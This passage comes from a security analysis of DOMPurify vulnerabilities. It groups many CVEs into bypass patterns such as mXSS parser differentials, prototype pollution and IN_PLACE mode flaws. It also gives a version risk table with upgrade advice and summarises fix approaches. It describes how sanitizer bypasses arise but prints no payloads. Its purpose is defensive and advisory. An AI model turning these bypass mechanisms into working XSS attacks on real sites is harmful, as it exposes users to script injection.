| 2026-06 | CVE-2026-65899 | 3.4.9 | Medium | Trusted Types policy state |
| 2026-06 | CVE-2026-65898 | 3.4.11 | High | setConfig ALLOWED_ATTR |
| 2026-07 | CVE-2026-66010 | 3.4.12 | Medium | CUSTOM_ELEMENT hook bypass |
| 2026-08 | CVE-2026-75838 | 3.4.13 | High | IN_PLACE hook detached subtree |

## 12.4 Recurring Vulnerability Patterns

### Pattern 1: mXSS / Parser Differentials (6 instances)

CVEs: CVE-2019-16728, CVE-2020-26870, GHSA-mjjq-c88q-qhr6, CVE-2024-47875, CVE-2026-47423, CVE-2026-65914

The most fundamental vulnerability class. Arises from the inherent non-idempotency of HTML serialization and re-parsing: `parse(serialize(parse(input))) != parse(input)`. The primary mechanisms are:

- **Namespace confusion**: Elements change namespace between sanitization parse and browser re-parse, causing `<style>` content to be reinterpreted from raw text to parsed markup.
- **Form nesting prohibition**: The HTML spec drops inner `<form>` elements on re-parse, restructuring the DOM tree.
- **Integration point exceptions**: MathML text integration points (`<mi>`, `<mo>`, `<mn>`, `<ms>`, `<mtext>`) switch child elements to HTML namespace, except `<mglyph>` and `<malignmark>` which stay in MathML.
- **Browser-specific element handling**: `selectedcontent` re-cloning in Chromium 148+ and WebKit 625+.

Common fix approaches: Additional namespace tracking during tree traversal, post-sanitization re-parse verification, blocklisting of elements that cause namespace transitions, and use of DOM output modes to avoid the serialize-reparse roundtrip.

### Pattern 2: Prototype Pollution Chains (5 instances)

CVEs: CVE-2024-48910, CVE-2024-45801, CVE-2026-41238, CVE-2026-65913, CVE-2026-65898

DOMPurify has repeatedly used object patterns vulnerable to prototype pollution. These vulnerabilities all require a separate pollution primitive but convert it to a full XSS bypass. Affected surfaces:

- `CUSTOM_ELEMENT_HANDLING` fallback using `|| {}` instead of `Object.create(null)`
- `USE_PROFILES` rebuilding `ALLOWED_ATTR` as a plain array susceptible to `Array.prototype` pollution
- `__depth` check relying on object property presence that can be polluted
- Direct config objects without prototype-safe cloning
- `setConfig()` mutations bypassing clone guards

Common fix: Replace `|| {}` with `Object.create(null)`, switch from arrays to `Set` or prototype-free objects, add `Object.hasOwn()` checks, deep-clone configuration objects.

### Pattern 3: IN_PLACE Mode Issues (7 instances)

CVEs: CVE-2026-49978, CVE-2026-75838, CVE-2026-49459, CVE-2026-49458, CVE-2026-65904, CVE-2026-65901, GHSA-4w3q-35jp-p934

IN_PLACE mode sanitizes a live DOM tree rather than parsing a string into a new document. This creates attack surfaces that do not exist in the default string-input path:

- **Shadow DOM traversal**: The node iterator does not descend into shadow roots within template content.
- **Cross-realm type checks**: `instanceof` fails for nodes from a different JavaScript realm (iframe).
- **DOM clobbering on root**: A `<form>` root with clobbering descendants causes `_isClobbered` to return true, skipping `_sanitizeAttributes`.
- **Hook detachment**: Hooks that remove nodes leave descendant event handlers live.
- **nodeName spoofing**: Attacker-controlled DOM objects with spoofed `nodeName` values bypass element-type checks.

Common fix: Replace `instanceof` with realm-agnostic checks (duck typing, `toString.call()`), validate `nodeName` against actual node type, extend iterator to shadow roots, neutralize all descendants when removing a node.

### Pattern 4: Configuration/API Misuse Surfaces (5 instances)

CVEs: CVE-2026-41240, CVE-2026-65903, CVE-2026-65912, CVE-2026-65911, CVE-2026-65902

Function-form predicates (`ADD_TAGS`, `ADD_ATTR`) and internal API surfaces create unexpected bypass paths:

- **Evaluation order errors**: `tagCheck` short-circuits before `FORBID_TAGS`, and `attrCheck` skips URI validation.
- **State leakage**: Predicate state leaks across `sanitize()` calls, progressively weakening sanitization.
- **Live allowlist mutation**: Hooks receive direct references to allowlists; mutations persist permanently.
- **setConfig pollution**: `setConfig()` bypasses clone guards meant to protect against hook mutations.

Common fix: Enforce evaluation order (FORBID checks first, then allowlist checks), isolate predicate state per call, pass shallow copies of allowlists to hooks, extend clone guards to all mutation paths.

### Pattern 5: Rawtext Element Handling Gaps (3 instances)

CVEs: CVE-2025-15599, CVE-2026-0540, CVE-2026-65914

The `SAFE_FOR_XML` regex has been repeatedly found missing rawtext elements:

- Version 3.2.7: Added `textarea`
- Version 3.3.2: Added `noscript`, `xmp`, `noembed`, `noframes`, `iframe`
- Re-contextualization attacks exploit rawtext context breakout when sanitized output is concatenated into a rawtext wrapper

Common fix: Enumerate all rawtext elements in the validation regex, add integration tests for each rawtext context.

## 12.5 Version Risk Summary

| Version Range | Known Vulnerabilities | Recommendation |
|--------------|----------------------|----------------|
| < 2.0.3 | CVE-2019-16728 + all older | Upgrade immediately |
| 2.0.3 - 2.0.6 | GHSA-mjjq-c88q-qhr6 | Upgrade immediately |
| 2.0.7 - 2.0.16 | CVE-2020-26870 | Upgrade immediately |
| 2.0.17 - 2.4.1 | CVE-2024-48910 | Upgrade immediately |
| 2.4.2 - 2.4.9 | CVE-2024-47875, CVE-2024-45801 | Upgrade immediately |
| 2.5.0 - 2.5.2 | CVE-2024-45801 (if < 2.5.4) | Upgrade to >= 2.5.9 |
| 2.5.3 - 2.5.8 | CVE-2025-15599, CVE-2026-0540 | Upgrade to >= 2.5.9 |
| >= 2.5.9 | End of 2.x maintenance (no further patches) | Migrate to 3.x |
| 3.0.0 - 3.1.2 | CVE-2024-47875 + others | Upgrade to >= 3.4.13 |
| 3.1.3 - 3.2.3 | CVE-2025-26791, CVE-2025-15599 | Upgrade to >= 3.4.13 |
| 3.2.4 - 3.2.6 | CVE-2025-15599 | Upgrade to >= 3.4.13 |
| 3.2.7 - 3.3.1 | CVE-2026-0540, CVE-2026-65914 + 3 others | Upgrade to >= 3.4.13 |
| 3.3.2 - 3.3.3 | CVE-2026-41238, CVE-2026-41240 + 3 others | Upgrade to >= 3.4.13 |
| 3.4.0 - 3.4.3 | CVE-2026-65904 | Upgrade to >= 3.4.13 |
| 3.4.4 | CVE-2026-47423 | Upgrade to >= 3.4.13 |
| 3.4.5 | CVE-2026-49459, CVE-2026-49458, + others | Upgrade to >= 3.4.13 |
| 3.4.6 | CVE-2026-65901, CVE-2026-65902, CVE-2026-49978 | Upgrade to >= 3.4.13 |
| 3.4.7 - 3.4.8 | CVE-2026-65899 | Upgrade to >= 3.4.13 |
| 3.4.9 - 3.4.10 | CVE-2026-65898 | Upgrade to >= 3.4.13 |
| 3.4.11 | CVE-2026-66010 | Upgrade to >= 3.4.13 |
| 3.4.12 | CVE-2026-75838 | Upgrade to >= 3.4.13 |
| >= 3.4.13 | No known vulnerabilities | Current recommended version |

## 12.6 Patch Analysis Patterns

Common fix approaches across the 30 vulnerabilities:

1. **Prototype-safe object construction**: Replacing `{}` with `Object.create(null)`, `Array` with `Set`, `in` with `Object.hasOwn()`. Applied in CVE-2024-48910, CVE-2026-41238, CVE-2026-65913, CVE-2026-65898.

2. **Evaluation order correction**: Moving FORBID checks before allowlist expansion checks. Applied in CVE-2026-41240, CVE-2026-65903.

3. **Defensive cloning of internal state**: Passing shallow copies of allowlists to hooks and config APIs instead of direct references. Applied in CVE-2026-65902, CVE-2026-65898.

4. **Realm-agnostic type checking**: Replacing `instanceof` with duck-typing or `Object.prototype.toString.call()`. Applied in CVE-2026-49458, CVE-2026-65904.

5. **Extended tree traversal**: Adding shadow root descent and template content traversal to the node iterator. Applied in CVE-2026-49978.

6. **Comprehensive rawtext element enumeration**: Adding missing rawtext elements to validation regexes. Applied in CVE-2025-15599, CVE-2026-0540.

7. **Post-sanitization re-parse verification**: Checking that the serialized output produces the same DOM tree when re-parsed. Applied in CVE-2024-47875, CVE-2020-26870.

8. **Element blocklisting**: Adding newly dangerous elements (e.g., `selectedcontent`) to the default forbidden list. Applied in CVE-2026-47423.

---
